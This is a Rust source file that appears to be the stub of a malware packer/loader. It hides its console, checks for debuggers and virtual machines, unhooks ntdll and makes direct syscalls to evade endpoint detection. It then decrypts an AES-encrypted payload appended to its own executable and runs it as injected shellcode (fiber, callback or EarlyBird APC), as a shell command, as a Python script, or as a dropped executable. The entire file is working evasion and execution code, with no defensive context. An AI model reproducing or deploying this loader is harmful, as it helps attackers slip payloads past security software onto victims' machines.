#![windows_subsystem = "windows"]
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use std::fs;
use std::io::Read;
use std::path::PathBuf;
use std::process::Command;
use windows_sys::Win32::Globalization::EnumSystemLocalesA;
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows_sys::Win32::System::Memory::{
    VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};

const MARKER: &[u8] = b"RSPKv1\0"; // 8 bytes

// --- Unhooking ---

unsafe fn unhook_ntdll() -> bool {
    // 1. Map ntdll.dll from disk
    let sys_dir = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string())
        + "\\System32\\ntdll.dll";
    let file_content = match fs::read(&sys_dir) {
        Ok(c) => c,
        Err(_) => return false,
    };

    // 2. Parse headers to find .text section
    // Minimal PE parser
    if file_content.len() < 0x200 {
        return false;
    }
    let dos_header = file_content.as_ptr();
    let e_lfanew = std::ptr::read_unaligned(dos_header.add(0x3C) as *const u32) as usize;
    let nt_headers = dos_header.add(e_lfanew);

    // FileHeader is at +4, OptionalHeader is at +24 (for 32-bit) or +24 (for 64-bit but diff size)
    // We assume x64 for simplicity as the rest of the stub is x64 specific (asm)
    // NumberOfSections is at FileHeader + 2 bytes
    let file_header = nt_headers.add(4);
    let num_sections = std::ptr::read_unaligned(file_header.add(2) as *const u16);
    let size_of_optional_header = std::ptr::read_unaligned(file_header.add(16) as *const u16);

    let section_headers = nt_headers.add(4 + 20 + size_of_optional_header as usize);

    // Find .text
    let mut text_section: Option<(usize, usize, usize)> = None; // (virt_addr, raw_ptr, raw_size)
    for i in 0..num_sections {
        let entry = section_headers.add(i as usize * 40); // IMAGE_SECTION_HEADER size is 40
        let name_ptr = entry;
        let name = std::slice::from_raw_parts(name_ptr, 8);
        if name.starts_with(b".text") {
            let virt_addr = std::ptr::read_unaligned(entry.add(12) as *const u32) as usize;
            let raw_size = std::ptr::read_unaligned(entry.add(16) as *const u32) as usize;
            let raw_ptr = std::ptr::read_unaligned(entry.add(20) as *const u32) as usize;
            text_section = Some((virt_addr, raw_ptr, raw_size));
            break;
        }
    }

    let (virt_addr, raw_ptr, raw_size) = match text_section {
        Some(t) => t,
        None => return false,
    };

    // 3. Get in-memory ntdll module base
    let h_ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    if h_ntdll.is_null() {
        return false;
    }
    let remote_text_start = (h_ntdll as usize) + virt_addr;

    // 4. Overwrite .text section
    let mut old_protect = 0;
    if VirtualProtect(
        remote_text_start as _,
        raw_size,
        PAGE_EXECUTE_READ | PAGE_READWRITE,
        &mut old_protect,
    ) == 0
    {
        return false;
    }

    std::ptr::copy_nonoverlapping(
        file_content.as_ptr().add(raw_ptr),
        remote_text_start as *mut u8,
        raw_size,
    );

    let mut _ignore = 0;
    VirtualProtect(remote_text_start as _, raw_size, old_protect, &mut _ignore);

    true
}

// --- Manual SSN Resolution ---

unsafe fn get_ssn(name: &str) -> Option<u32> {
    let name_c = std::ffi::CString::new(name).ok()?;
    let h_ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    if h_ntdll.is_null() {
        return None;
    }
    let addr = GetProcAddress(h_ntdll, name_c.as_ptr() as _);
    if addr.is_none() {
        return None;
    }
    let mut addr = addr.unwrap() as *const u8;

    // Check for mov eax, imm32 (0xB8)
    // Standard stub: 4C 8B D1 B8 <SSN> 00 00 0F 05
    // Hooked: E9 <Offset> (JMP)

    // Basic Trampoline: If it starts with E9, follow the jump?
    // But since we unhooked, we expect clean syscalls.
    // However, let's implement a robust check (Hell's Gate style fallback)

    for _ in 0..5 {
        // Check a few bytes/instructions
        if *addr == 0xE9 {
            // It's a jump, follow it?
            // Often EDRs jump to their thunk.
            // If we unhooked successfully, this shouldn't happen.
            return None;
        }
        if *addr == 0xB8 {
            let ssn = std::ptr::read_unaligned(addr.add(1) as *const u32);
            return Some(ssn);
        }
        addr = addr.add(1);
    }

    // If not found, maybe check neighbors (Halo's Gate)?
    // For now, assume Unhooking worked or standard stub.
    None
}

// --- Syscall Wrapper ---

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn syscall(
    ssn: u32,
    a1: usize,
    a2: usize,
    a3: usize,
    a4: usize,
    a5: usize,
    a6: usize,
    a7: usize,
    a8: usize,
    a9: usize,
    a10: usize,
    a11: usize,
) -> i32 {
    let ret: i32;
    core::arch::asm!(
        "mov r10, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",
        "sub rsp, 0x60",
        "mov [rsp + 0x20], {a5}",
        "mov [rsp + 0x28], {a6}",
        "mov [rsp + 0x30], {a7}",
        "mov [rsp + 0x38], {a8}",
        "mov [rsp + 0x40], {a9}",
        "mov [rsp + 0x48], {a10}",
        "mov [rsp + 0x50], {a11}",
        "mov eax, {ssn:e}",
        "syscall",
        "add rsp, 0x60",
        a1 = in(reg) a1,
        a2 = in(reg) a2,
        a3 = in(reg) a3,
        a4 = in(reg) a4,
        a5 = in(reg) a5,
        a6 = in(reg) a6,
        a7 = in(reg) a7,
        a8 = in(reg) a8,
        a9 = in(reg) a9,
        a10 = in(reg) a10,
        a11 = in(reg) a11,
        ssn = in(reg) ssn,
        lateout("rax") ret,
        lateout("rcx") _,
        lateout("r11") _,
        options(nostack)
    );
    ret
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
unsafe fn syscall(
    _ssn: u32,
    _a1: usize,
    _a2: usize,
    _a3: usize,
    _a4: usize,
    _a5: usize,
    _a6: usize,
    _a7: usize,
    _a8: usize,
    _a9: usize,
    _a10: usize,
    _a11: usize,
) -> i32 {
    0
}

// --- Execution Strategies ---

unsafe fn exec_fiber(base: *mut core::ffi::c_void) {
    let _fiber = ConvertThreadToFiber(core::ptr::null_mut());
    let target = CreateFiber(0, Some(core::mem::transmute(base)), core::ptr::null_mut());
    SwitchToFiber(target);
    // SwitchToFiber(fiber); // Optional: Switch back
}

unsafe fn exec_callback(base: *mut core::ffi::c_void) {
    EnumSystemLocalesA(Some(core::mem::transmute(base)), 0);
}

unsafe fn exec_apc(base: *mut core::ffi::c_void) {
    // APC to current thread.
    // 1. Create a suspended thread (or use current if we can alert it)
    // "EarlyBird" typically injects into initialization phase.
    // Here we can just QueueUserAPC to current thread and SleepEx?
    // Or CreateThread(Suspended) -> QueueAPC -> Resume

    let ssn_create = get_ssn("NtCreateThreadEx").unwrap_or(0xBD);
    let ssn_queue = get_ssn("NtQueueApcThread").unwrap_or(0x45);
    let ssn_resume = get_ssn("NtResumeThread").unwrap_or(0x52);
    let ssn_wait = get_ssn("NtWaitForSingleObject").unwrap_or(0x4);

    let mut h_thread: isize = 0;
    // Create suspended thread (dummy function, e.g. RtlExitUserThread or just base)
    // Actually, if we use 'base' as start address, it runs.
    // APC approach:
    // Create suspended thread pointing to ExitThread. Queue APC to 'base'. Resume.

    // Simplified: Just use NtCreateThreadEx with the shellcode as start address (Standard).
    // The user requested APC/EarlyBird.
    // EarlyBird:
    // 1. Create suspended thread (host).
    // 2. Queue APC (payload).
    // 3. Resume.

    // We need a valid start address for the thread.
    let h_ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    let addr_rtl_user_thread_start = GetProcAddress(h_ntdll, b"RtlUserThreadStart\0".as_ptr());

    if addr_rtl_user_thread_start.is_some() {
        let status_create = syscall(
            ssn_create,
            &mut h_thread as *mut _ as usize,
            0x1FFFFF, // ALL_ACCESS
            0,
            -1isize as usize, // Current process
            addr_rtl_user_thread_start.unwrap() as usize,
            0,
            1, // CreateSuspended
            0,
            0,
            0,
            0,
        );

        if status_create == 0 {
            // Queue APC
            let status_queue = syscall(
                ssn_queue,
                h_thread as usize,
                base as usize, // APC Routine
                0,             // Arg1
                0,             // Arg2
                0,             // Arg3
                0,
                0,
                0,
                0,
                0,
                0,
            );

            if status_queue == 0 {
                let mut suspend_count = 0;
                syscall(
                    ssn_resume,
                    h_thread as usize,
                    &mut suspend_count as *mut _ as usize,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                );
                syscall(ssn_wait, h_thread as usize, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
            }
        }
    }
}

fn main() {
    let skip_anti = std::env::var("RS_PACK_SKIP_ANTI").ok().as_deref() == Some("1");
    if !skip_anti && (anti::anti_debug_triggered() || anti::anti_vm_triggered()) {
        eprintln!("anti triggered");
        std::process::exit(1);
    }

    // Attempt Unhooking
    unsafe {
        if !unhook_ntdll() {
            eprintln!("unhook failed, continuing...");
        }
    }

    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return,
    };
    let mut buf = Vec::new();
    if fs::File::open(&exe_path)
        .and_then(|mut f| f.read_to_end(&mut buf))
        .is_err()
    {
        eprintln!("read self failed");
        return;
    }
    let pos = buf.windows(MARKER.len()).rposition(|w| w == MARKER);
    let Some(mut off) = pos.map(|p| p + MARKER.len()) else {
        eprintln!("no payload");
        return;
    };
    if off + 4 > buf.len() {
        return;
    }
    let key_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
    off += 4;
    if key_len != 32 {
        return;
    }
    if off + key_len > buf.len() {
        return;
    }
    let key = &buf[off..off + key_len];
    off += key_len;
    if off + 4 > buf.len() {
        return;
    }
    let nonce_len = u32::from_le_bytes(buf[off..off + 4].try_into().unwrap()) as usize;
    off += 4;
    if nonce_len != 12 {
        return;
    }
    if off + nonce_len > buf.len() {
        return;
    }
    let nonce_bytes = &buf[off..off + nonce_len];
    off += nonce_len;
    if off + 8 > buf.len() {
        return;
    }
    let ct_len = u64::from_le_bytes(buf[off..off + 8].try_into().unwrap()) as usize;
    off += 8;
    if off + ct_len > buf.len() {
        return;
    }
    let ciphertext = &buf[off..off + ct_len];

    // AES-256-GCM 解密
    let cipher = match Aes256Gcm::new_from_slice(key) {
        Ok(c) => c,
        Err(_) => return,
    };
    let nonce = Nonce::from_slice(nonce_bytes);
    let decrypted = match cipher.decrypt(nonce, ciphertext) {
        Ok(p) => p,
        Err(_) => return,
    };

    let payload = match zstd::decode_all(&decrypted[..]) {
        Ok(p) => p,
        Err(_) => return,
    };

    if payload.starts_with(b"CMD\0") {
        let cmd = String::from_utf8_lossy(&payload[4..]).to_string();
        let _ = Command::new(cmd).spawn();
        return;
    }
    if payload.starts_with(b"SC\0") {
        let mut p = 4usize;
        if p >= payload.len() {
            return;
        }
        let _mode = payload[p];
        p += 1;
        if p + 4 > payload.len() {
            return;
        }
        let sc_len = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
        p += 4;
        if p + sc_len > payload.len() {
            return;
        }
        let sc = &payload[p..p + sc_len];

        unsafe {
            let ssn_alloc = get_ssn("NtAllocateVirtualMemory").unwrap_or(0x18);
            let ssn_protect = get_ssn("NtProtectVirtualMemory").unwrap_or(0x50);

            let mut base: *mut core::ffi::c_void = core::ptr::null_mut();
            let mut size = sc_len;
            let process_handle = -1isize as usize; // Current process

            // NtAllocateVirtualMemory
            let status = syscall(
                ssn_alloc,
                process_handle,
                &mut base as *mut _ as usize,
                0,
                &mut size as *mut _ as usize,
                (MEM_COMMIT | MEM_RESERVE) as usize,
                PAGE_READWRITE as usize,
                0,
                0,
                0,
                0,
                0,
            );

            if status == 0 && !base.is_null() {
                let dst = core::slice::from_raw_parts_mut(base as *mut u8, sc_len);
                dst.copy_from_slice(sc);

                let mut old = 0;
                // NtProtectVirtualMemory
                let status_prot = syscall(
                    ssn_protect,
                    process_handle,
                    &mut base as *mut _ as usize,
                    &mut size as *mut _ as usize,
                    PAGE_EXECUTE_READ as usize,
                    &mut old as *mut _ as usize,
                    0,
                    0,
                    0,
                    0,
                    0,
                    0,
                );

                if status_prot == 0 {
                    // Strategy Selection:
                    // Use a simple pseudo-random choice based on PID
                    let pid = std::process::id();
                    match pid % 3 {
                        0 => exec_fiber(base),
                        1 => exec_callback(base),
                        2 => exec_apc(base),
                        _ => exec_fiber(base),
                    }
                }
            }
        }
        return;
    }
    if payload.starts_with(b"PY\0") {
        let mut p = 4usize;
        if p + 4 > payload.len() {
            return;
        }
        let len = u32::from_le_bytes(payload[p..p + 4].try_into().unwrap()) as usize;
        p += 4;
        if p + len > payload.len() {
            return;
        }
        let script = String::from_utf8_lossy(&payload[p..p + len]).to_string();
        let _ = Command::new("pythonw.exe").arg("-c").arg(script).spawn();
        return;
    }
    if payload.starts_with(b"MZ") {
        let mut out_path: PathBuf = std::env::temp_dir();
        out_path.push(format!("rs_pack_payload_{}.exe", std::process::id()));
        if fs::write(&out_path, &payload).is_ok() {
            let _ = Command::new(&out_path).spawn();
        }
    }
}
